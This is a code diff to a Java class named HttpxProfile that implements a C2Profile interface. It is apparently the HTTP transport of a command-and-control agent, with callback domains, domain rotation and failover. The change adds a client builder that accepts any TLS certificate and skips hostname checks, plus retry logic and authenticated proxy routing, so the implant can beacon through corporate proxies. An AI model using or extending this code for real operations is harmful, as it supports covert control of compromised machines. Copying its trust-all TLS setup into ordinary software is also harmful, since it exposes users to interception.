@@ -7,9 +7,20 @@ import org.apache.hc.client5.http.classic.methods.HttpPost;
 import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
 import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
 import org.apache.hc.client5.http.impl.classic.HttpClients;
+import org.apache.hc.client5.http.impl.classic.HttpClientBuilder;
+import org.apache.hc.client5.http.impl.routing.DefaultProxyRoutePlanner;
+import org.apache.hc.core5.http.HttpHost;
 import org.apache.hc.core5.http.ContentType;
 import org.apache.hc.core5.http.io.entity.ByteArrayEntity;
 import org.apache.hc.core5.http.io.entity.EntityUtils;
+import org.apache.hc.client5.http.auth.AuthScope;
+import org.apache.hc.client5.http.auth.UsernamePasswordCredentials;
+import org.apache.hc.client5.http.impl.auth.BasicCredentialsProvider;
+import org.apache.hc.client5.http.ssl.SSLConnectionSocketFactory;
+import org.apache.hc.client5.http.ssl.TrustAllStrategy;
+import org.apache.hc.client5.http.ssl.NoopHostnameVerifier;
+import org.apache.hc.core5.ssl.SSLContextBuilder;
+import javax.net.ssl.SSLContext;
 
 import java.nio.charset.StandardCharsets;
 import java.util.*;
@@ -32,7 +43,7 @@ public class HttpxProfile implements C2Profile {
     
     public HttpxProfile(Config config) {
         this.config = config;
-        this.httpClient = HttpClients.createDefault();
+        this.httpClient = buildHttpClient(config);
         this.objectMapper = new ObjectMapper();
         this.aesKey = null;
         
@@ -46,6 +57,57 @@ public class HttpxProfile implements C2Profile {
         Config.debugLog(config, "  Domains: " + callbackDomains);
         Config.debugLog(config, "  Rotation: " + domainRotation);
         Config.debugLog(config, "  Failover threshold: " + failoverThreshold);
+    }
+    
+    private static CloseableHttpClient buildHttpClient(Config config) {
+        try {
+            HttpClientBuilder builder = HttpClients.custom();
+            
+            // Disable SSL certificate verification (like oopsie's danger_accept_invalid_certs)
+            SSLContext sslContext = SSLContextBuilder.create()
+                .loadTrustMaterial(new TrustAllStrategy())
+                .build();
+            SSLConnectionSocketFactory sslSocketFactory = new SSLConnectionSocketFactory(
+                sslContext,
+                NoopHostnameVerifier.INSTANCE
+            );
+            builder.setConnectionManager(
+                org.apache.hc.client5.http.impl.io.PoolingHttpClientConnectionManagerBuilder.create()
+                    .setSSLSocketFactory(sslSocketFactory)
+                    .setValidateAfterInactivity(org.apache.hc.core5.util.Timeout.ofSeconds(2))
+                    .build()
+            );
+            
+            // Enable automatic retry on connection failures (especially for proxy issues)
+            builder.setRetryStrategy(new org.apache.hc.client5.http.impl.DefaultHttpRequestRetryStrategy(
+                3, // max 3 retries
+                org.apache.hc.core5.util.TimeValue.ofMilliseconds(100) // 100ms delay between retries
+            ));
+            
+            // Configure proxy if set
+            if (config.hasProxy()) {
+                HttpHost proxy = new HttpHost(config.getProxyHost(), config.getProxyPort());
+                DefaultProxyRoutePlanner routePlanner = new DefaultProxyRoutePlanner(proxy);
+                builder.setRoutePlanner(routePlanner);
+                
+                Config.debugLog(config, "Configuring HTTPX proxy: " + config.getProxyHost() + ":" + config.getProxyPort());
+                
+                // Add proxy authentication if credentials provided
+                if (config.getProxyUser() != null && !config.getProxyUser().isEmpty()) {
+                    BasicCredentialsProvider credsProvider = new BasicCredentialsProvider();
+                    credsProvider.setCredentials(
+                        new AuthScope(proxy),
+                        new UsernamePasswordCredentials(config.getProxyUser(), config.getProxyPass().toCharArray())
+                    );
+                    builder.setDefaultCredentialsProvider(credsProvider);
+                    Config.debugLog(config, "Proxy authentication configured for user: " + config.getProxyUser());
+                }
+            }
+            
+            return builder.build();
+        } catch (Exception e) {
+            throw new RuntimeException("Failed to create HTTP client", e);
+        }
     }
     
     private List<String> parseCallbackDomains() {
